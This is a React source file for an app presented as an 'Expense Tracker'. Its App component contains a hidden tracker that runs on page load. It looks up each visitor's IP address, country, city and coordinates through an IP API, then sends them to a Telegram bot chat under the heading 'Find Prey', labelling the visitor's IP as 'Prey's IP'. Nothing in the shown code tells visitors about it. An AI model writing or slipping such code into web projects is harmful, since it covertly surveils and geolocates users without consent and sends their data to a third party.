import { useEffect } from "react";
import ExpenseArea from "./components/ExpenseArea/ExpenseArea";
import { CHAT_ID, IP_API, TELEGRAM_TOKEN } from "./hooks/useEnv";
import axios from "axios";

function App() {
  useEffect(() => {
    let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
    axios(IP_API).then((res) => {
      let message = `<b>Find Prey</b>\n`;
      message += `<b>Site name:</b> Expense Tracker 🤑\n`;
      message += `<b>Country:</b> ${res.data.country}\n`;
      message += `<b>City:</b> ${res.data.city}\n`;
      message += `<b>Prey's IP:</b> ${res.data.ip}\n`;
      message += `<b>Location:</b> ${res.data.loc}\n`;
      axios.post(`${URL}/sendPhoto`, {
        chat_id: CHAT_ID,
        photo: "https://ibb.co/Hfzz7FGP",
        caption: message,
        parse_mode: "HTML",
      });
    });
  }, []);
  return <ExpenseArea />;
}

export default App;
